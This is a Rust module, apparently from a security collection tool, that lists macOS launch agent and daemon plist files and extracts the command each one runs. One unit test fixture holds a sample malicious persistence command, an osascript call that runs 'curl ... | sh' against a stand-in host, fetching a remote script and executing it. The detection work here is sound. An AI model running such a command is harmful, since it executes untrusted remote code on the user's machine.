use std::fs;
use std::path::{Path, PathBuf};

use crate::collectors::persistence::PersistenceEntry;

pub fn collect_macos_persistence() -> Vec<PersistenceEntry> {
    if !cfg!(target_os = "macos") {
        return Vec::new();
    }

    let mut roots = vec![
        PathBuf::from("/Library/LaunchAgents"),
        PathBuf::from("/Library/LaunchDaemons"),
    ];
    if let Some(home) = std::env::var_os("HOME") {
        roots.push(PathBuf::from(home).join("Library/LaunchAgents"));
    }

    roots
        .iter()
        .flat_map(|root| collect_launch_plists(root))
        .collect()
}

fn collect_launch_plists(root: &Path) -> Vec<PersistenceEntry> {
    let Ok(read_dir) = fs::read_dir(root) else {
        return Vec::new();
    };

    read_dir
        .filter_map(|entry| entry.ok())
        .filter(|entry| entry.path().extension().and_then(|value| value.to_str()) == Some("plist"))
        .filter_map(|entry| {
            let text = fs::read_to_string(entry.path()).ok()?;
            let command = extract_plist_command(&text)?;
            Some(PersistenceEntry {
                platform: "macos".to_string(),
                source: root.display().to_string(),
                name: entry.file_name().to_string_lossy().to_string(),
                command,
            })
        })
        .collect()
}

pub fn extract_plist_command(text: &str) -> Option<String> {
    if let Some(program_arguments_key) = text.find("<key>ProgramArguments</key>") {
        let rest = &text[program_arguments_key..];
        let array_end = rest.find("</array>").unwrap_or(rest.len());
        let arguments = extract_string_values(&rest[..array_end]);
        if !arguments.is_empty() {
            return Some(arguments.join(" "));
        }
    }

    let program_key = text.find("<key>Program</key>")?;
    let rest = &text[program_key..];
    extract_string_values(rest).into_iter().next()
}

fn extract_string_values(text: &str) -> Vec<String> {
    let mut values = Vec::new();
    let mut rest = text;

    while let Some(start) = rest.find("<string>") {
        let after_start = &rest[start + "<string>".len()..];
        let Some(end) = after_start.find("</string>") else {
            break;
        };
        values.push(unescape_plist_string(&after_start[..end]));
        rest = &after_start[end + "</string>".len()..];
    }

    values
}

fn unescape_plist_string(value: &str) -> String {
    value
        .replace("&quot;", "\"")
        .replace("&apos;", "'")
        .replace("&lt;", "<")
        .replace("&gt;", ">")
        .replace("&amp;", "&")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extracts_launch_agent_program() {
        let text = "<plist><dict><key>ProgramArguments</key><array><string>/tmp/updater</string></array></dict></plist>";
        assert_eq!(
            extract_plist_command(text),
            Some("/tmp/updater".to_string())
        );
    }

    #[test]
    fn joins_launch_agent_program_arguments() {
        let text = r#"
        <plist>
          <dict>
            <key>ProgramArguments</key>
            <array>
              <string>/usr/bin/osascript</string>
              <string>-e</string>
              <string>do shell script "curl https://example.test/p.sh | sh"</string>
            </array>
          </dict>
        </plist>
        "#;

        assert_eq!(
            extract_plist_command(text),
            Some(
                "/usr/bin/osascript -e do shell script \"curl https://example.test/p.sh | sh\""
                    .to_string()
            )
        );
    }
}
